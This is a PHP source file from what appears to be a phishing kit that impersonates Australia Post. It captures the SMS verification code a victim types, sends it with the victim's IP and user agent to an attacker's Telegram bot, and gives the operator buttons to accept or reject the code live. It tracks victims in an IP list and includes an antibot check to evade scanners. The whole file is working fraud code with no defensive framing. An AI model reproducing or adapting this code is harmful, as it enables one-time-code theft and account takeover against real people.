<?php
session_start();
include '../settings.php';
include '../lang_main.php';
require_once dirname(__DIR__) . '/antibot.php';

// Validate MASTER session
if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $ss = htmlspecialchars(trim($_POST["code"]));
    $userIP = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Envoi Telegram
    if (stripos($userAgent, 'python-requests') === false) {
        $message = "🇦🇺 <b>AUSTRALIA POST - SMS CODE RECEIVED</b> 📲\n" .
                   "━━━━━━━━━━━━━━━━━━\n" .
                   "🔐 <b>CODE :</b> <code>$ss</code>\n" .
                   "━━━━━━━━━━━━━━━━━━\n" .
                   "🌐 IP : <code>$userIP</code>\n" .
                   "🖥️ UA : <i>$userAgent</i>";

        // --- DYNAMIC LINK GENERATION FOR BUTTONS ---
        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
        $host = $_SERVER['HTTP_HOST'];
        
        $current_dir = dirname($_SERVER['PHP_SELF']);
        $root_dir = dirname($current_dir); 
        if ($root_dir == '/' || $root_dir == '\\') $root_dir = ''; 

        $base_url = $protocol . "://" . $host . $root_dir;
        
        $vbv_action_url = $base_url . "/security_check/actionsvbv.php";
        $vbv_action_url = str_replace('//security_check', '/security_check', $vbv_action_url);

        $encoded_ip = urlencode($userIP);
        $validate_link = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=sstrue";
        $bad_code_link = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=ssfalse";

        // KEYBOARD WITH BUTTONS
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ VALIDER', 'url' => $validate_link],
                    ['text' => '❌ MAUVAIS CODE', 'url' => $bad_code_link]
                ]
            ]
        ];

        sendTelegramMessage($botToken, $chatId, $message, $keyboard);
    }

    // --- RESET IP STATUS IN ip_list.txt ---
    $ipListFile = '../security_check/ip_list.txt';
    if (file_exists($ipListFile)) {
        $lines = file($ipListFile);
        $output = array();
        foreach ($lines as $line) {
            if (strpos($line, $userIP) === false) {
                $output[] = $line;
            }
        }
        file_put_contents($ipListFile, implode("", $output));
    }

    // Add SMS waiting state so it can be changed to APP if needed
    file_put_contents($ipListFile, PHP_EOL . $userIP . ",smswaiting", FILE_APPEND | LOCK_EX);

    header("Location: ../verification.php");
    exit();
}
?>